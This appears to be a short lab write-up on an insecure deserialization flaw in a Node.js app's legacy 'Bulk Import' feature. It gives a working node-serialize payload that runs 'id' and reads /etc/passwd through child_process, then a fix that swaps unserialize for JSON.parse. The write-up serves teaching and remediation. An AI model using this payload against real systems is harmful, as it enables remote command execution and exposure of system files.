
## Vulnerability 

The Legacy `Bulk Import` feature does not securely deserialize the data. 


## Exploitation 

Json to exploit the vulnerability 
```json
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id;cat /etc/passwd', function(error, stdout, stderr) { console.log(stdout) });}()"}
```

which is the serialized version of
```js
var y = {
 rce : function(){
 require('child_process').exec('id;cat /etc/passwd', function(error, stdout, stderr) { console.log(stdout) });
 }(),
}
```

The attack is not visilble from front end because the commands we execute visible only with logs. 
Therefore, We need to SSH to the VM and see docker logs 
```
docker-compose logs
```






## Fix
---

Change the way we deserialize 

#### Changes to `appHandler.js`
```js
// Remove 
var products = serialize.unserialize(req.files.products.data.toString('utf8'))

// Add the following code		
var products = JSON.parse(req.files.products.data.toString('utf8'))
```


